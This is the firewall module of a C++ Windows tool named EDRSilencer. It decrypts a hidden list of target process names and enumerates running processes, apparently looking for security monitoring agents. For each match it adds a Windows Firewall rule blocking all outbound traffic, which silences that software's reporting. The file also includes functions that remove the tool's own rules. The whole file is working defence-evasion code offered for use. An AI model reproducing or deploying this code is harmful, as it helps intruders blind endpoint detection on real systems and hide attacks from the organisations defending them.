#include "firewall.hpp"
#include <strsafe.h>
#include "errors.hpp"
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#include <string>
#include <vector>
#include <memory>
#include "ComPtr.hpp"
#include "HandleWrapper.hpp"

namespace EDRSilencer {

    // --- Helper Functions and RAII for COM/BSTR ---

    struct CoInit {
        HRESULT hr;
        CoInit() : hr(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE)) {}
        ~CoInit() {
            if (SUCCEEDED(hr) && hr != RPC_E_CHANGED_MODE) {
                CoUninitialize();
            }
        }
    };

    static BSTR AnsiToBSTR(const std::string& input) {
        if (input.empty()) return NULL;
        int lenA = static_cast<int>(input.length());
        int lenW = MultiByteToWideChar(CP_ACP, 0, input.c_str(), lenA, NULL, 0);
        if (lenW == 0) return NULL;
        BSTR bstr = SysAllocStringLen(NULL, lenW);
        if (bstr) {
            MultiByteToWideChar(CP_ACP, 0, input.c_str(), lenA, bstr, lenW);
        }
        return bstr;
    }

    // Note: The older Initialize/Uninitialize helpers are replaced by CoInit + ComPtr.

    static void CheckFirewallState(INetFwPolicy2* pFwPolicy) {
        long currentProfiles = 0;
        if (FAILED(pFwPolicy->get_CurrentProfileTypes(&currentProfiles))) return;

        if (currentProfiles & NET_FW_PROFILE2_DOMAIN) {
            VARIANT_BOOL enabled;
            if (SUCCEEDED(pFwPolicy->get_FirewallEnabled(NET_FW_PROFILE2_DOMAIN, &enabled)) && enabled == VARIANT_FALSE) {
                PRINTF("[!] Warning: Firewall is disabled for the Domain profile.\n");
            }
        }
        if (currentProfiles & NET_FW_PROFILE2_PRIVATE) {
            VARIANT_BOOL enabled;
            if (SUCCEEDED(pFwPolicy->get_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, &enabled)) && enabled == VARIANT_FALSE) {
                PRINTF("[!] Warning: Firewall is disabled for the Private profile.\n");
            }
        }
        if (currentProfiles & NET_FW_PROFILE2_PUBLIC) {
            VARIANT_BOOL enabled;
            if (SUCCEEDED(pFwPolicy->get_FirewallEnabled(NET_FW_PROFILE2_PUBLIC, &enabled)) && enabled == VARIANT_FALSE) {
                PRINTF("[!] Warning: Firewall is disabled for the Public profile.\n");
            }
        }
    }

    static BOOL FirewallRuleExists(INetFwPolicy2* pFwPolicy, const std::wstring& appPath) {
        BOOL exists = FALSE;
        EDRSilencer::ComPtr<INetFwRules> pFwRules;
        if (FAILED(pFwPolicy->get_Rules(pFwRules.address_of()))) return FALSE;

        EDRSilencer::ComPtr<IEnumVARIANT> pEnum;
        EDRSilencer::ComPtr<IUnknown> pUnk;
        if (SUCCEEDED(pFwRules->get__NewEnum(pUnk.address_of())) && pUnk) {
            pUnk->QueryInterface(IID_IEnumVARIANT, pEnum.put_void());
        }

        if (pEnum) {
            VARIANT var;
            VariantInit(&var);
            while (SUCCEEDED(pEnum->Next(1, &var, NULL)) && var.vt == VT_DISPATCH) {
                EDRSilencer::ComPtr<INetFwRule> pFwRule;
                if (SUCCEEDED(var.pdispVal->QueryInterface(IID_INetFwRule, pFwRule.put_void()))) {
                    BSTR bstrGrouping = NULL;
                    if (SUCCEEDED(pFwRule->get_Grouping(&bstrGrouping)) && bstrGrouping && wcscmp(bstrGrouping, FIREWALL_RULE_GROUP) == 0) {
                        BSTR bstrAppPath = NULL;
                        if (SUCCEEDED(pFwRule->get_ApplicationName(&bstrAppPath)) && bstrAppPath && _wcsicmp(bstrAppPath, appPath.c_str()) == 0) {
                            exists = TRUE;
                        }
                        SysFreeString(bstrAppPath);
                    }
                    SysFreeString(bstrGrouping);
                }
                VariantClear(&var);
                if (exists) break;
            }
        }
        return exists;
    }

    void FirewallAddRuleByPath(std::string_view processPath) {
        CoInit co;
        if (FAILED(co.hr) && co.hr != RPC_E_CHANGED_MODE) {
            EPRINTF("[-] COM initialization failed: 0x%lX\n", co.hr);
            return;
        }
        EDRSilencer::ComPtr<INetFwPolicy2> pFwPolicy;
        HRESULT hr = CoCreateInstance(CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, IID_INetFwPolicy2, pFwPolicy.put_void());
        if (FAILED(hr)) { EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr); return; }

        std::wstring wProcessPath;
        AnsiToWide(processPath, wProcessPath);

        if (FirewallRuleExists(pFwPolicy.get(), wProcessPath)) {
            WPRINTF(L"[!] Firewall rule for %s already exists. Skipping.\n", wProcessPath.c_str());
        } else {
            EDRSilencer::ComPtr<INetFwRule> pFwRule;
            HRESULT hrRule = CoCreateInstance(CLSID_NetFwRule, NULL, CLSCTX_INPROC_SERVER, IID_INetFwRule, pFwRule.put_void());
            if (SUCCEEDED(hrRule)) {
                std::string processPathStr(processPath);
                size_t last_slash = processPathStr.find_last_of("/\\");
                std::string filenameA = processPathStr.substr(last_slash + 1);
                std::wstring filenameW;
                AnsiToWide(filenameA, filenameW);

                wchar_t ruleNameW[MAX_PATH];
                StringCchPrintfW(ruleNameW, MAX_PATH, FIREWALL_RULE_NAME_FORMAT, filenameW.c_str());

                BSTR bstrRuleName = SysAllocString(ruleNameW);
                BSTR bstrAppPath = AnsiToBSTR(processPathStr);
                BSTR bstrGrouping = SysAllocString(FIREWALL_RULE_GROUP);

                pFwRule->put_Name(bstrRuleName);
                pFwRule->put_ApplicationName(bstrAppPath);
                pFwRule->put_Action(NET_FW_ACTION_BLOCK);
                pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
                pFwRule->put_Grouping(bstrGrouping);
                pFwRule->put_Enabled(VARIANT_TRUE);
                pFwRule->put_Profiles(NET_FW_PROFILE2_ALL);
                pFwRule->put_Protocol(256); // NET_FW_IP_PROTOCOL_ANY

                EDRSilencer::ComPtr<INetFwRules> pFwRules;
                if(SUCCEEDED(pFwPolicy->get_Rules(pFwRules.address_of()))) {
                    hr = pFwRules->Add(pFwRule.get());
                    if (SUCCEEDED(hr)) {
                        WPRINTF(L"[+] Firewall block rule added for %s.\n", wProcessPath.c_str());
                    } else {
                        EPRINTF("[-] Failed to add firewall rule. Error: 0x%lX\n", hr);
                    }
                }

                SysFreeString(bstrRuleName);
                SysFreeString(bstrAppPath);
                SysFreeString(bstrGrouping);
            }
        }
    }

    void FirewallConfigureBlockRules() {
        if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }

        CoInit co;
        if (FAILED(co.hr) && co.hr != RPC_E_CHANGED_MODE) { EPRINTF("[-] COM initialization failed: 0x%lX\n", co.hr); return; }
        EDRSilencer::ComPtr<INetFwPolicy2> pFwPolicy;
        HRESULT hr = CoCreateInstance(CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, IID_INetFwPolicy2, pFwPolicy.put_void());
        if (FAILED(hr)) { EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr); return; }

        CheckFirewallState(pFwPolicy.get());

        std::vector<std::string> decryptedNames;
        decryptedNames.reserve(PROCESS_DATA_COUNT);
        for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
            decryptedNames.emplace_back(decryptString(processData[i]));
        }

        EDRSilencer::Handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if (snapshot.valid()) {
            PROCESSENTRY32W pe32{};
            pe32.dwSize = sizeof(PROCESSENTRY32W);
            if (Process32FirstW(snapshot.get(), &pe32)) {
                do {
                    for (const auto& name : decryptedNames) {
                        if (!name.empty()) {
                            std::wstring nameW(name.begin(), name.end());
                            if (lstrcmpiW(pe32.szExeFile, nameW.c_str()) == 0) {
                                PRINTF("[+] Found target process: %s\n", name.c_str());
                                WCHAR fullPathW[MAX_PATH];
                                if (getProcessFullPath(pe32.th32ProcessID, fullPathW, MAX_PATH)) {
                                    std::wstring ws(fullPathW);
                                    std::string fullPathA;
                                    WideToAnsi(ws, fullPathA);
                                    FirewallAddRuleByPath(fullPathA);
                                }
                            }
                        }
                    }
                } while (Process32NextW(snapshot.get(), &pe32));
            }
        }
    }

    void FirewallRemoveAllRules() {
        CoInit co;
        if (FAILED(co.hr) && co.hr != RPC_E_CHANGED_MODE) { EPRINTF("[-] COM initialization failed: 0x%lX\n", co.hr); return; }
        EDRSilencer::ComPtr<INetFwPolicy2> pFwPolicy;
        HRESULT hr = CoCreateInstance(CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, IID_INetFwPolicy2, pFwPolicy.put_void());
        if (FAILED(hr)) { EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr); return; }

        EDRSilencer::ComPtr<INetFwRules> pFwRules;
        if (FAILED(pFwPolicy->get_Rules(pFwRules.address_of()))) {
            return;
        }

        long ruleCount = 0;
        pFwRules->get_Count(&ruleCount);
        if (ruleCount == 0) {
            PRINTF("[+] No firewall rules to process.\n");
            
            return;
        }

        ULONG removedCount = 0;
        IEnumVARIANT* pEnum = NULL;
        IUnknown* pUnk = NULL;
        if (SUCCEEDED(pFwRules->get__NewEnum(&pUnk)) && pUnk) {
            pUnk->QueryInterface(IID_IEnumVARIANT, reinterpret_cast<void**>(&pEnum));
            pUnk->Release();
        }

        if (pEnum) {
            VARIANT var;
            VariantInit(&var);
            while (SUCCEEDED(pEnum->Next(1, &var, NULL)) && var.vt == VT_DISPATCH) {
                EDRSilencer::ComPtr<INetFwRule> pFwRule;
                if (SUCCEEDED(var.pdispVal->QueryInterface(IID_INetFwRule, pFwRule.put_void()))) {
                    BSTR bstrGrouping = NULL;
                    if (SUCCEEDED(pFwRule->get_Grouping(&bstrGrouping)) && bstrGrouping && wcscmp(bstrGrouping, FIREWALL_RULE_GROUP) == 0) {
                        BSTR bstrName = NULL;
                        if(SUCCEEDED(pFwRule->get_Name(&bstrName)) && bstrName) {
                            if(SUCCEEDED(pFwRules->Remove(bstrName))) {
                                removedCount++;
                            }
                            SysFreeString(bstrName);
                        }
                    }
                    SysFreeString(bstrGrouping);
                }
                VariantClear(&var);
            }
        }

        if (removedCount > 0) {
            PRINTF("[+] Removed %lu firewall rule(s) created by this tool.\n", removedCount);
        } else {
            PRINTF("[+] No firewall rules from this tool were found to remove.\n");
        }

        
    }

    void FirewallRemoveRuleByName(std::string_view ruleName) {
        CoInit co;
        if (FAILED(co.hr) && co.hr != RPC_E_CHANGED_MODE) { EPRINTF("[-] COM initialization failed: 0x%lX\n", co.hr); return; }
        EDRSilencer::ComPtr<INetFwPolicy2> pFwPolicy;
        HRESULT hr = CoCreateInstance(CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, IID_INetFwPolicy2, pFwPolicy.put_void());
        if (FAILED(hr)) { EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr); return; }

        EDRSilencer::ComPtr<INetFwRules> pFwRules;
        if (SUCCEEDED(pFwPolicy->get_Rules(pFwRules.address_of()))) {
            std::string ruleNameStr(ruleName);
            BSTR bstrRuleName = AnsiToBSTR(ruleNameStr);
            if (bstrRuleName) {
                if (SUCCEEDED(pFwRules->Remove(bstrRuleName))) {
                    PRINTF("[+] Successfully removed firewall rule: %s\n", ruleNameStr.c_str());
                }
                SysFreeString(bstrRuleName);
            }
        }
    }

    void FirewallRemoveRuleByPath(std::string_view processPath) {
        std::string processPathStr(processPath);
        size_t last_slash = processPathStr.find_last_of("/\\");
        std::string filenameA = processPathStr.substr(last_slash + 1);
        std::wstring filenameW(filenameA.begin(), filenameA.end());

        wchar_t ruleNameW[MAX_PATH];
        StringCchPrintfW(ruleNameW, MAX_PATH, FIREWALL_RULE_NAME_FORMAT, filenameW.c_str());

        std::wstring ws(ruleNameW);
        std::string ruleNameA;
        WideToAnsi(ws, ruleNameA);

        FirewallRemoveRuleByName(ruleNameA);
    }
}
